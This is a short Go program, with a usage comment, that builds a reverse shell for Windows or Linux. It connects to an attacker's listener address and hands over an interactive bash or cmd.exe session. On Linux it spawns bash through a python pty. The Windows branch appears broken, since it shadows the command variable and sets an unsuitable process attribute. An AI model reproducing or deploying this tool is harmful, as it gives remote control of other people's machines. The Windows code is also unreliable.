/*
This is a Go program which will create a reverse shell by connecting to a specified address and port. It can be used to create both Windows and Linux reverse shells.

Usage: Edit line 23 in shell.go to use the IP address and port of your listener. Compile and then execute the program from the target machine to have it establish a session with you.

Compiling for Windows: GOOS=windows go build shell.go

Compiling for Linux: GOOS=linux go build shell.go
*/

package main

import (
	"net"
	"os"
	"os/exec"
	"runtime"
	"syscall"
)

func main() {
	// Create a new connection to the specified address.
	if client, err := net.Dial("tcp" /*IP:Port*/, "localhost:6969"); err == nil {
		var cmd *exec.Cmd
		// Switch which shell to use depending on the OS.
		switch runtime.GOOS {
		case "linux":
			os.Setenv("TERM", "xterm-256color")
			cmd = exec.Command("/bin/bash", "-c", "python -c \"import pty; pty.spawn('/bin/bash')\"")
		case "windows":
			cmd := exec.Command("cmd.exe")
			cmd.SysProcAttr = &syscall.SysProcAttr{Foreground: false}
		}
		cmd.Stdin = client
		cmd.Stdout = client
		cmd.Stderr = client
		// Runs the platform-specific command.
		cmd.Run()
		client.Close()
	}
}
